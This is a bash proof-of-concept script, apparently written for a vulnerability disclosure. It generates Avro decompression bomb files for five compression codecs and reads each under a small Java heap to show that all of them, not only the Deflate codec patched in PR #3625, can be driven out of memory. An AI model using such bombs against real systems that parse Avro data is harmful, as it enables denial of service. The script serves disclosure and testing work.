#!/usr/bin/env bash
#
# Avro Decompression Bomb PoC - Multi-Codec Test
#
# Demonstrates that CWE-409 affects ALL Avro compression codecs,
# not just Deflate.  PR #3625 only patches DeflateCodec; the other
# four codecs (BZip2, Zstandard, Snappy, XZ) remain fully vulnerable.
#
# Each codec is tested by generating a 50 MB bomb and attempting to
# read it with -Xmx32m.  Exit code 99 = vulnerability confirmed.
#
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
JAR="$SCRIPT_DIR/target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar"

echo "============================================================="
echo " Avro Decompression Bomb PoC -- Multi-Codec Proof (CWE-409)"
echo "============================================================="
echo
echo " This proves that ALL Avro Java codecs are vulnerable,"
echo " not just Deflate (which is the only one PR #3625 fixes)."
echo
echo "============================================================="
echo

# Step 0: Build if needed
if [ ! -f "$JAR" ]; then
    echo "[*] Building project..."
    mvn -f "$SCRIPT_DIR/pom.xml" -q package -DskipTests
    echo "[+] Build complete."
    echo
fi

# Codecs to test.  Snappy achieves low compression on repetitive data,
# so we use a larger heap trigger threshold for it.
# Format: codec_name:trigger_heap_MB
CODECS="deflate:32 bzip2:32 zstandard:32 snappy:48 xz:32"

PASS=0
FAIL=0
SKIP=0

for entry in $CODECS; do
    CODEC="${entry%%:*}"
    HEAP="${entry##*:}"
    BOMB_FILE="$SCRIPT_DIR/bomb-${CODEC}.avro"

    echo "============================================================="
    echo " Codec: ${CODEC}"
    echo "============================================================="
    echo

    # Step 1: Generate bomb file
    echo "[*] Generating 50 MB bomb with codec=${CODEC}..."
    set +e
    java -Xmx256m -cp "$JAR" poc.CraftBomb "$BOMB_FILE" 50 "$CODEC" 2>&1
    GEN_EXIT=$?
    set -e
    echo

    if [ $GEN_EXIT -ne 0 ]; then
        echo "[!] SKIP: Failed to generate bomb with codec=${CODEC} (exit=$GEN_EXIT)"
        echo "    This codec may not be available on this platform."
        echo
        SKIP=$((SKIP + 1))
        continue
    fi

    # Step 2: Trigger OOM
    echo "[*] Reading bomb-${CODEC}.avro with -Xmx${HEAP}m..."
    echo
    set +e
    java -Xmx${HEAP}m -cp "$JAR" poc.TriggerOOM "$BOMB_FILE" 2>&1
    EXIT_CODE=$?
    set -e

    echo
    if [ $EXIT_CODE -eq 99 ]; then
        echo "[+] ${CODEC}: VULNERABILITY CONFIRMED (exit=99)"
        PASS=$((PASS + 1))
    elif [ $EXIT_CODE -eq 0 ]; then
        echo "[-] ${CODEC}: OOM not triggered (heap was large enough)"
        FAIL=$((FAIL + 1))
    else
        echo "[?] ${CODEC}: Unexpected exit code $EXIT_CODE"
        FAIL=$((FAIL + 1))
    fi
    echo

    # Clean up the bomb file
    rm -f "$BOMB_FILE"
done

echo "============================================================="
echo " RESULTS SUMMARY"
echo "============================================================="
echo
echo " Codecs tested:     $(echo $CODECS | wc -w)"
echo " Vulnerable (OOM):  $PASS"
echo " Not triggered:     $FAIL"
echo " Skipped:           $SKIP"
echo
if [ $PASS -gt 1 ]; then
    echo " CONCLUSION: The vulnerability exists in MULTIPLE codecs."
    echo " PR #3625 only patches DeflateCodec -- the other codecs"
    echo " remain exploitable even after the PR is merged."
fi
echo
echo "============================================================="

# Exit 99 if any codec was confirmed vulnerable
if [ $PASS -gt 0 ]; then
    exit 99
else
    exit 0
fi
